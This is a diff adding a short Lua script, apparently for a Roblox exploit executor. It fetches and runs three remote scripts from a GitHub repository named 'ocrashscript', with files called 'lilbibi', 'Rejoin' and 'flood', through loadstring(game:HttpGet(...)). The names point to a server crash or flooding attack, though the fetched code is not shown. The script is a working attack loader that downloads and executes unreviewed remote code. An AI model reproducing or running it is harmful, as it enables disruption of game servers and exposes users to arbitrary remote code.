@@ -1,0 +1,9 @@
+-- script to execute 
+
+-- V4
+
+local s,err = pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PrRobloxSCipter/ocrashscript/refs/heads/main/lilbibi"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PrRobloxSCipter/ocrashscript/refs/heads/main/Rejoin"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PrRobloxSCipter/ocrashscript/refs/heads/main/flood"))()
+end)
